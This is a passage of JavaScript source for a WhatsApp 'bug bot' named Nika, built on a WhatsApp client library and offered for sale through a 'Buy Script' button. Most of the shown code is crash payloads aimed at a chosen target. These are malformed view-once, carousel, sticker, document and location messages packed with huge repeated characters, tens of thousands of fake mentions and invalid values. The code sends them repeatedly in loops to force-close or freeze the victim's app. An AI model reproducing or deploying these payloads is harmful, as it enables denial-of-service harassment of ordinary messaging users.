        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: Buffer.from("c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=", "base64"),
        fileLength: "289511",
        seconds: 15,
        mediaKey: Buffer.from("IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=", "base64"),
        caption: "💫 ANGKASA",
        height: 640,
        width: 640,
        fileEncSha256: Buffer.from("BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=", "base64"),
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿💫 ANGKASA⃟"
        },
        streamingSidecar: Buffer.from("cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=", "base64"),
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: Buffer.from("QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=", "base64"),
        thumbnailEncSha256: Buffer.from("fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=", "base64"),
        annotations: [
            {
                embeddedContent: { embeddedMusic },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});

    await depayy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await depayy.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
  // Function fc new
async function combo3(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𝗡𝗜𝗞𝗔☀',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𝗡𝗜𝗞𝗔☀"
                },
                footer: {
                  text: "nika.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ nika.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await depayy.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("Bug")} to ${target}`))
}
async function combo2(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𝗡𝗜𝗞𝗔☀',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𝗡𝗜𝗞𝗔☀"
                },
                footer: {
                  text: "nika.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await depayy.relayMessage("status@broadcast", msg, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
}   
    //Bulldozersv2
async function bulldozerV2(target) {
  const stickerPayload = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
      fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
      fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
      mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
      mimetype: "image/webp",
      directPath: "/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
      fileLength: { low: 99999999, high: 0, unsigned: true },
      mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
      firstFrameLength: 50000,
      firstFrameSidecar: "QmFkUmVhZHlUT1JFQ1Q=",
      isAnimated: true,
      isAvatar: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: Array.from({ length: 60000 }, () =>
          "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
        ),
        forwardingScore: 999999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u200E".repeat(40000),
          body: "\u200E".repeat(40000),
          mediaUrl: "",
          mediaType: 1,
          thumbnail: Buffer.from([]),
          sourceUrl: "",
          renderLargerThumbnail: true
        }
      }
    }
  };

  const templatePayload = {
    templateMessage: {
      hydratedTemplate: {
        hydratedContentText: "\u200E".repeat(90000),
        hydratedFooterText: "Oblivion Force Activated",
        hydratedButtons: [],
        templateId: "oblivion_" + Date.now(),
        contextInfo: {
          quotedMessage: stickerPayload,
          forwardingScore: 88888,
          isForwarded: true
        }
      }
    }
  };

  const wrap = {
    viewOnceMessage: {
      message: templatePayload
    }
  };

  const msg = generateWAMessageFromContent(target, wrap, {
    quoted: null,
    messageId: "oblv_" + Date.now()
  });

  await depayy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}             
     // Fungsi Pemanggilan function bug
 async function DepayDelayInvis(target) {
for (let i = 0; i <= 10; i++) {
await protocolbug6(target)
await sleep(5000)
await protocolbug7(target) 
await sleep(5000)
await protocolbug5(target) 
await sleep(5000)
await protocolbug7(target) 
await sleep(5000)
await ProtoXAudio(target)
await sleep(5000) 
await bulldozer(target) 
await sleep(5000) 
}
     
     
            }
 
 async function DepayDelayCombo(target) {
for (let i = 0; i <= 10; i++) {
await protocolbug6(target)
await sleep(5000)
await protocolbug7(target) 
await sleep(5000)
await protocolbug5(target) 
await sleep(5000)
await protocolbug7(target) 
await sleep(5000)
await protoXvid(target)
await sleep(5000)
await ProtoXAudio(target) 
await sleep(5000)
await bulldozer(target) 
await sleep(5000)
}  
     
     
            }    
         
         //Buldozer
 async function Depaybuldozer(target) {
for (let i = 0; i <= 10; i++) {
await bulldozerV2(target)
await sleep(5000)
await bulldozer(target) 
await sleep(5000)
await protocolbug5(target) 
await sleep(5000)
await ProtoXAudio(target) 
}  
     
     
            }   

   //Forclosebug
 async function DepayForclose(target) {
for (let i = 0; i <= 50.; i++) {
await combo3(target)
await sleep(2000)
await combo2(target) 
await sleep(2000)
await combo3(target) 
}  
     
     
            } 

   //Protocolbug
 async function Depayprotocolbug(target) {
for (let i = 0; i <= 50.; i++) {
await protocolbug6(target)
await sleep(5000)
await protocolbug7(target) 
await sleep(5000)
await protocolbug5(target) 
await sleep(5000)
await protocolbug7(target) 
await sleep(5000)
await protocolbug5(target) 
}  
     
     
            }                                                   
            //CrashJid ( Bug Saluran )         
async function CrashJids(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await depayy.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

//Function Forclose
async function NikaFC(target) {
for (let r = 0; r < 1; r++) {
try {
let msg = await generateWAMessageFromContent(
  target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          header: {
            title: "",
              hasMediaAttachment: false,
              locationMessage: {
              degreesLatitude: 1e309,
              degreesLongitude: -1e309,
              name: '{'.repeat(50000),
              address: '{'.repeat(50000),
              },
            },
           contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [" 0@s.whatsapp.net"]
          },
            body: {
              text: "Nika.js",
            },
            nativeFlowMessage: {
              messageParamsJson: '{'.repeat(50000),
            },
          },
        },
      },
    },
    {}
  );
  await depayy.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
} catch (err) {
console.log("Error Sending Bug", err);
}
console.log("Nika Menyerang Target 😠 ")
}
}
async function DocFC(target) {
  for (let r = 0; r < 1; r++) {
    try {
      let msg = await generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "Nika Anjay",
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 999999999,
                    degreesLongitude: -999999999,
                    name: '{'.repeat(100000),
                    address: '{'.repeat(100000),
                  },
                },
                contextInfo: {
                  participant: "0@s.whatsapp.net",
                  remoteJid: "X",
                  mentionedJid: ["0@s.whatsapp.net"]
                },
                body: {
                  text: "Nika.js",
                },
                nativeFlowMessage: {
                  messageParamsJson: '{'.repeat(100000),
                },
              },
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                fileSha256: Buffer.from("ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=", "base64"),
                fileLength: "974197419741",
                pageCount: "974197419741",
                mediaKey: Buffer.from("5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", "base64"),
                fileName: "𝄽̸̷̷̸̛̽͢͟͠͞͡͏́͢͟͡".repeat(70),
                fileEncSha256: Buffer.from("pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=", "base64"),
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173"
              }
            }
          }
        },
        {}
      );
      await depayy.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
    } catch (err) {
      console.log("Error Sending Bug:", err);
    }
    console.log("Succesfuly Sending Bug");
  }
}
async function PrePortDoc(target) {
  try {
    let message = proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Dit? Yess sir",
              hasMediaAttachment: false,
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                mimetype: "penis",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "99999999",
                pageCount: 9999,
                 mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
              },
            },
            body: {
              text: "ХᏟՏᏢᎽᎬХϴᏃᎬͲ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 50000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    });

    await depayy.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function invisSqL(isTarget) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await depayy.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}
//end

//END

//Auto Clean Sampah
function autoClearSession() {
if (!global.autoclsession) {
console.log(chalk.yellow.bold('📂 [AUTO CLEAN] Auto clear session is disabled. Skipping cleanup.'));
return; }
const sessionDir = `./${global.sessionName}`;
const clearInterval = 6 * 60 * 60 * 1000; // Bersihkan setiap 6 jam
const clearSessionFiles = () => {
try {
if (!fs.existsSync(sessionDir)) {
console.log(chalk.green.bold('📂 [AUTO CLEAN] Session directory does not exist. Skipping cleanup.'));
return; }
if (depayy.ws.readyState !== 1) {
console.log(chalk.yellow.bold('⚠️ [AUTO CLEAN] Bot sedang reconnecting. Pembersihan ditunda.'));
return; }
const files = fs.readdirSync(sessionDir);
if (files.length === 0) {
console.log(chalk.yellow.bold('📂 [AUTO CLEAN] No session files to clean. Everything is tidy! 📑'));
return; }
const activeFiles = ['creds.json', 'auth_info.json'];
const filesToDelete = files.filter(file =>
(file.startsWith('pre-key') || file.startsWith('sender-key') || file.startsWith('session-') || file.startsWith('app-state')) &&
!activeFiles.includes(file));
if (filesToDelete.length === 0) {
console.log(chalk.blue.bold('📂 [AUTO CLEAN] No unnecessary session files to clean. 📑'));
return; }
console.log(chalk.yellow.bold(`📂 [AUTO CLEAN] Found ${filesToDelete.length} session files to clean... 🗃️`));
filesToDelete.forEach(file => {
const filePath = path.join(sessionDir, file);
fs.unlink(filePath, (err) => {
if (err) {
console.error(chalk.red.bold(`❌ Failed to delete ${file}: ${err.message}`));
} else {
console.log(chalk.green.bold(`🗑️ Deleted: ${file}`))}})});
console.log(chalk.green.bold(`🗃️ [AUTO CLEAN] Successfully removed ${filesToDelete.length} session files! 📂`));
} catch (error) {
console.error(chalk.red.bold('📑 [AUTO CLEAN ERROR]'), chalk.red.bold(error.message))}};
setInterval(clearSessionFiles, clearInterval);
clearSessionFiles()}
if (global.autoclsession) {
autoClearSession();
} else {
console.log(chalk.yellow.bold('📂 [AUTO CLEAN] Auto clear session feature is turned off. No action taken.'))}


//Succes Send Bug
async function ReplyBug(teks) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363401699840819@newsletter",
newsletterName: `𝗦𝘂𝗻 𝗚𝗼𝗱 𝗡𝗶𝗸𝗮☀`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: { url: `https://files.catbox.moe/44x2qy.jpg` } }, { upload: depayy.waUploadToServer })),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Buy Script\",\"url\":\"https://wa.me/6281257180104\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Cek Target\",\"url\":\"https://wa.me/${target}\",\"merchant_url\":\"https://www.google.com\"}`
}],
}), })}
}}, {quoted: m})
await depayy.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net", 
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2008",
      thumbnail: payy,
      itemCount: "11",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `𝐕𝟏𝟏 𝐍𝐈𝐊𝐀`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
//END

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'nika':
case 'menu': {
await depayy.sendMessage(m.chat, { react: { text: "⚡",key: m.key,}})
let timestamp = speed();
let latensi = speed() - timestamp;
let res = `ⓘ こんにちは、私はニカです。あなたを助ける準備ができているボットです。⚠︎
╔⚍━ ⌜\`𝙏𝙍𝘼𝙎𝙃-𝘾𝙊𝙍𝙀\` ⌟ ➯
║Θ Creator : Depayy
║Θ BotName : Nikaa
║Θ Version : *17Vip*
║Θ Runtime : *${runtime(process.uptime())}* 
║Θ Type : Case`
let foter = `
║Click the button below and see what I can do, use the feature wisely 
║Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯
`
async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};


 (async () => {

const buttons = [
  {
    buttonId: ".owner", 
    buttonText: { 
